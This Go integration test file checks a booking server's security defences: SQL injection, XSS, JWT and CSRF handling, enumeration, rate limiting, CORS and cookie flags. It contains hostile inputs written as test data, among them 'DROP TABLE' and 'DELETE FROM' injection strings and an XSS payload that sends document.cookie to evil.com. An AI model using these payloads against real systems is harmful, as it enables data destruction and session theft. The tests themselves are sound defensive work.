//go:build integration

package main

import (
	"fmt"
	"net/http"
	"strings"
	"testing"

	"github.com/stodulski/vibe-server/internal/platform/config"
)

// ═══════════════════════════════════════════════════════════════
// SQL INJECTION TESTS
// ═══════════════════════════════════════════════════════════════

func TestSecurity_SQLInjection_Login(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	payloads := []string{
		`"email":"' OR 1=1--","password":"test"`,
		`"email":"admin@test.com","password":"' OR '1'='1"`,
		`"email":"'; DROP TABLE users;--","password":"test"`,
		`"email":"\" OR \"\"=\"","password":"\" OR \"\"=\""`,
		`"email":"admin@test.com' UNION SELECT * FROM users--","password":"test"`,
	}

	for _, payload := range payloads {
		body := "{" + payload + "}"
		status, _, _ := integrationPost(t, ts, "/api/v1/auth/login", body, nil, "")
		if status == http.StatusOK {
			t.Errorf("SQL injection succeeded with payload: %s", payload)
		}
		if status == http.StatusInternalServerError {
			t.Errorf("SQL injection caused server error (possible vulnerability) with payload: %s", payload)
		}
	}
}

func TestSecurity_SQLInjection_Register(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	payloads := []struct {
		field string
		value string
	}{
		{"first_name", "Robert'; DROP TABLE users;--"},
		{"last_name", "' OR '1'='1"},
		{"email", "test@test.com' UNION SELECT * FROM users--"},
		{"phone", "'; DELETE FROM users;--"},
	}

	for _, p := range payloads {
		body := fmt.Sprintf(`{"email":"sqli-%s@test.com","password":"TestPass123!","first_name":"Test","last_name":"User","phone":"+5491100000001"}`, p.field)
		body = strings.Replace(body, fmt.Sprintf(`"%s"`, getFieldDefault(p.field)), fmt.Sprintf(`"%s"`, p.value), 1)

		status, _, _ := integrationPost(t, ts, "/api/v1/auth/register", body, nil, "")
		if status == http.StatusInternalServerError {
			t.Errorf("SQL injection via %s caused server error with: %s", p.field, p.value)
		}
	}
}

func TestSecurity_SQLInjection_PublicBooking(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	// Try SQL injection in the slug parameter
	slugs := []string{
		"' OR 1=1--",
		"'; DROP TABLE complexes;--",
		"complejo-test' UNION SELECT * FROM users--",
	}

	for _, slug := range slugs {
		status, _, _ := integrationGet(t, ts, "/api/v1/public/complexes/"+slug, nil, "")
		if status == http.StatusInternalServerError {
			t.Errorf("SQL injection via slug caused server error with: %s", slug)
		}
	}
}

// ═══════════════════════════════════════════════════════════════
// XSS TESTS
// ═══════════════════════════════════════════════════════════════

func TestSecurity_XSS_StoredViaRegister(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	xssPayloads := []string{
		`<script>alert('xss')</script>`,
		`<img src=x onerror=alert('xss')>`,
		`"><script>document.location='http://evil.com/?c='+document.cookie</script>`,
		`javascript:alert('xss')`,
		`<svg onload=alert('xss')>`,
	}

	for i, payload := range xssPayloads {
		body := fmt.Sprintf(`{
			"email":"xss%d@test.com",
			"password":"TestPass123!",
			"first_name":"%s",
			"last_name":"Test",
			"phone":"+549110000%04d"
		}`, i, payload, i)

		status, _, _ := integrationPost(t, ts, "/api/v1/auth/register", body, nil, "")
		// Should either reject (422 validation) or accept and sanitize — never 500
		if status == http.StatusInternalServerError {
			t.Errorf("XSS payload caused server error: %s", payload)
		}
	}

	// Login and check that stored data is returned as JSON (not HTML-executed)
	cookies, csrf := registerAndLogin(t, ts, "xss-check@test.com", "TestPass123!")
	status, _, result := integrationGet(t, ts, "/api/v1/auth/me", cookies, csrf)
	if status != http.StatusOK {
		t.Fatalf("get me: expected 200, got %d", status)
	}

	// Verify Content-Type is JSON (prevents browser from interpreting as HTML)
	user, _ := result["user"].(map[string]any)
	if user != nil {
		// The response should be JSON, not HTML — the Content-Type header
		// is set to application/json by writeJSON, which prevents XSS
		t.Log("User data returned as JSON (Content-Type: application/json) — XSS safe")
	}
}

func TestSecurity_XSS_ResponseHeaders(t *testing.T) {
	pool := setupTestDB(t)
	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	status, headers, _ := integrationGet(t, ts, "/api/v1/healthcheck", nil, "")
	if status != http.StatusOK {
		t.Fatalf("healthcheck: expected 200, got %d", status)
	}

	// Verify security headers that prevent XSS
	checks := map[string]string{
		"X-Content-Type-Options":            "nosniff",
		"X-Frame-Options":                   "DENY",
		"Content-Security-Policy":           "default-src 'none'",
		"X-Permitted-Cross-Domain-Policies": "none",
		"Referrer-Policy":                   "origin-when-cross-origin",
		"Strict-Transport-Security":         "max-age=63072000; includeSubDomains; preload",
		"Permissions-Policy":                "camera=(), microphone=(), geolocation=()",
	}

	for header, expected := range checks {
		got := headers.Get(header)
		if got != expected {
			t.Errorf("security header %s: expected %q, got %q", header, expected, got)
		}
	}

	// Content-Type should be JSON for API responses
	ct := headers.Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type should be application/json, got %q", ct)
	}
}

// ═══════════════════════════════════════════════════════════════
// AUTHENTICATION & AUTHORIZATION TESTS
// ═══════════════════════════════════════════════════════════════

func TestSecurity_Auth_ProtectedEndpointsRequireAuth(t *testing.T) {
	pool := setupTestDB(t)
	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	protectedEndpoints := []struct {
		method string
		path   string
	}{
		{"GET", "/api/v1/auth/me"},
		{"GET", "/api/v1/complexes"},
		{"POST", "/api/v1/complexes"},
	}

	for _, ep := range protectedEndpoints {
		var status int
		switch ep.method {
		case "GET":
			status, _, _ = integrationGet(t, ts, ep.path, nil, "")
		case "POST":
			status, _, _ = integrationPost(t, ts, ep.path, `{}`, nil, "")
		}

		if status != http.StatusUnauthorized {
			t.Errorf("%s %s without auth: expected 401, got %d", ep.method, ep.path, status)
		}
	}
}

func TestSecurity_Auth_InvalidJWT(t *testing.T) {
	pool := setupTestDB(t)
	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	invalidTokens := []string{
		"invalid-token",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U", // wrong secret
		"",
	}

	for _, token := range invalidTokens {
		cookies := []*http.Cookie{{Name: "access_token", Value: token}}
		status, _, _ := integrationGet(t, ts, "/api/v1/auth/me", cookies, "")
		if status == http.StatusOK {
			t.Errorf("invalid JWT accepted: %s", token[:min(len(token), 30)])
		}
	}
}

func TestSecurity_Auth_CSRF_Required(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	cookies, _ := registerAndLogin(t, ts, "csrf-test@test.com", "TestPass123!")

	// POST without CSRF token should fail
	status, _, _ := integrationPost(t, ts, "/api/v1/complexes",
		`{"name":"CSRF Test","slug":"csrf-test","address":"Test","city":"Test","province":"Test","phone":"+5491100000001","cancellation_hours":24}`,
		cookies, "") // empty CSRF token

	if status == http.StatusCreated {
		t.Error("POST /complexes succeeded without CSRF token — CSRF protection bypassed!")
	}
	if status != http.StatusForbidden {
		t.Logf("POST without CSRF returned %d (expected 403)", status)
	}
}

func TestSecurity_Auth_PasswordHashTiming(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	// Register a user
	registerAndLogin(t, ts, "timing-test@test.com", "TestPass123!")

	// Login with existing email (wrong password) — should do bcrypt compare
	status1, _, _ := integrationPost(t, ts, "/api/v1/auth/login",
		`{"email":"timing-test@test.com","password":"wrong"}`, nil, "")

	// Login with non-existent email — should also do bcrypt compare (timing safe)
	status2, _, _ := integrationPost(t, ts, "/api/v1/auth/login",
		`{"email":"nonexistent@test.com","password":"wrong"}`, nil, "")

	// Both should return same status code (anti-enumeration)
	if status1 != status2 {
		t.Errorf("different status for existing (%d) vs non-existing (%d) user — timing leak", status1, status2)
	}
}

func TestSecurity_Auth_EmailEnumeration(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	// Register a user
	integrationPost(t, ts, "/api/v1/auth/register",
		`{"email":"enum-test@test.com","password":"TestPass123!","first_name":"Test","last_name":"User","phone":"+5491100000001"}`,
		nil, "")

	// Try to register same email — should return same success response
	status, _, result := integrationPost(t, ts, "/api/v1/auth/register",
		`{"email":"enum-test@test.com","password":"TestPass123!","first_name":"Test","last_name":"User","phone":"+5491100000002"}`,
		nil, "")

	if status != http.StatusCreated {
		t.Errorf("duplicate email returned %d instead of 201 — email enumeration possible", status)
	}

	msg, _ := result["message"].(string)
	if msg != "verification email sent" {
		t.Errorf("duplicate email message %q differs from success — enumeration possible", msg)
	}
}

// ═══════════════════════════════════════════════════════════════
// RATE LIMITING TESTS
// ═══════════════════════════════════════════════════════════════

func TestSecurity_RateLimit_AuthEndpoints(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	// The ceiling goes in before the constructor runs. Set on app.config
	// afterwards it reaches nothing: middleware.Config took its copy already.
	app := newIntegrationApp(t, pool, func(c *config.Config) {
		c.Limiter.Enabled = true
		c.Limiter.RPS = 2
		c.Limiter.Burst = 3
	})

	ts := newIntegrationServer(t, app)

	// Send rapid requests to healthcheck (fast, no bcrypt) to trigger rate limit
	rateLimited := false
	for i := 0; i < 20; i++ {
		status, _, _ := integrationGet(t, ts, "/api/v1/healthcheck", nil, "")
		if status == http.StatusTooManyRequests {
			rateLimited = true
			break
		}
	}

	if !rateLimited {
		t.Error("endpoint was not rate limited after 20 rapid requests with burst=3")
	}
}

// ═══════════════════════════════════════════════════════════════
// INPUT VALIDATION TESTS
// ═══════════════════════════════════════════════════════════════

func TestSecurity_Input_OversizedBody(t *testing.T) {
	pool := setupTestDB(t)
	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	// Send a body larger than 1MB (the maxBytes limit)
	largeBody := `{"email":"` + strings.Repeat("a", 2_000_000) + `@test.com","password":"test"}`
	status, _, _ := integrationPost(t, ts, "/api/v1/auth/login", largeBody, nil, "")

	if status == http.StatusOK || status == http.StatusInternalServerError {
		t.Errorf("oversized body: expected 400/413, got %d", status)
	}
}

func TestSecurity_Input_MalformedJSON(t *testing.T) {
	pool := setupTestDB(t)
	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	malformed := []string{
		`{invalid json`,
		`{"email": "test@test.com"`,
		`<xml>not json</xml>`,
		`null`,
		`[]`,
	}

	for _, body := range malformed {
		status, _, _ := integrationPost(t, ts, "/api/v1/auth/login", body, nil, "")
		if status == http.StatusOK || status == http.StatusInternalServerError {
			t.Errorf("malformed JSON accepted or caused error: %s → %d", body[:min(len(body), 30)], status)
		}
	}
}

func TestSecurity_Auth_LockedAccount(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	// Register a user
	registerAndLogin(t, ts, "lockout@test.com", "TestPass123!")

	// Send many wrong password attempts — should trigger lockout
	var lastStatus int
	for i := 0; i < 15; i++ {
		lastStatus, _, _ = integrationPost(t, ts, "/api/v1/auth/login",
			`{"email":"lockout@test.com","password":"wrong-password"}`, nil, "")
	}

	// Should be locked (429) or still rejecting (401)
	if lastStatus != http.StatusTooManyRequests && lastStatus != http.StatusUnauthorized {
		t.Errorf("after 15 wrong attempts: expected 429 or 401, got %d", lastStatus)
	}
}

// ═══════════════════════════════════════════════════════════════
// CORS TESTS
// ═══════════════════════════════════════════════════════════════

func TestSecurity_CORS_OnlyAllowedOrigin(t *testing.T) {
	pool := setupTestDB(t)
	app := newIntegrationApp(t, pool)
	ts := newIntegrationServer(t, app)

	// Preflight with allowed origin
	req, err := http.NewRequestWithContext(t.Context(), http.MethodOptions, ts.URL+"/api/v1/auth/login", nil)
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Origin", "http://localhost:5173")
	req.Header.Set("Access-Control-Request-Method", "POST")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = resp.Body.Close() }()

	allowedOrigin := resp.Header.Get("Access-Control-Allow-Origin")
	if allowedOrigin != "http://localhost:5173" {
		t.Errorf("CORS allowed origin: expected http://localhost:5173, got %q", allowedOrigin)
	}

	// Preflight with disallowed origin
	req2, err := http.NewRequestWithContext(t.Context(), http.MethodOptions, ts.URL+"/api/v1/auth/login", nil)
	if err != nil {
		t.Fatal(err)
	}
	req2.Header.Set("Origin", "http://evil.com")
	req2.Header.Set("Access-Control-Request-Method", "POST")

	resp2, err := client.Do(req2)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = resp2.Body.Close() }()

	disallowedOrigin := resp2.Header.Get("Access-Control-Allow-Origin")
	if disallowedOrigin == "http://evil.com" {
		t.Error("CORS allows requests from http://evil.com — cross-origin attack possible!")
	}
}

// ═══════════════════════════════════════════════════════════════
// COOKIE SECURITY TESTS
// ═══════════════════════════════════════════════════════════════

func TestSecurity_Cookies_SecureAttributes(t *testing.T) {
	pool := setupTestDB(t)
	cleanupDB(t, pool)

	// Production before construction: auth.Config decides the Secure flag when
	// the token service is built, so setting app.config.Env afterwards leaves
	// the cookies exactly as development wrote them.
	app := newIntegrationApp(t, pool, func(c *config.Config) { c.Env = "production" })
	ts := newIntegrationServer(t, app)

	// Register and login
	integrationPost(t, ts, "/api/v1/auth/register",
		`{"email":"cookie-test@test.com","password":"TestPass123!","first_name":"Test","last_name":"User","phone":"+5491100000001"}`,
		nil, "")

	// Manually verify email for production mode. If this UPDATE fails the login
	// below returns 403 and every cookie assertion in this test silently
	// inspects an empty Set-Cookie list, so the failure has to be fatal here.
	if _, err := pool.Exec(t.Context(), "UPDATE users SET email_verified = true WHERE email = 'cookie-test@test.com'"); err != nil {
		t.Fatalf("verify email: %v", err)
	}

	_, headers, _ := integrationPost(t, ts, "/api/v1/auth/login",
		`{"email":"cookie-test@test.com","password":"TestPass123!"}`, nil, "")

	for _, line := range headers.Values("Set-Cookie") {
		cookie, err := http.ParseSetCookie(line)
		if err != nil {
			continue
		}

		if cookie.Name == "access_token" || cookie.Name == "refresh_token" {
			if !cookie.HttpOnly {
				t.Errorf("%s cookie is not HttpOnly — vulnerable to XSS cookie theft", cookie.Name)
			}
			if !cookie.Secure {
				t.Errorf("%s cookie is not Secure in production — sent over HTTP", cookie.Name)
			}
			if cookie.SameSite != http.SameSiteLaxMode {
				t.Errorf("%s cookie SameSite is not Lax — CSRF vulnerable", cookie.Name)
			}
		}
	}
}

// ═══════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════

func getFieldDefault(field string) string {
	switch field {
	case "first_name":
		return "Test"
	case "last_name":
		return "User"
	case "email":
		return "sqli-email@test.com"
	case "phone":
		return "+5491100000001"
	default:
		return ""
	}
}
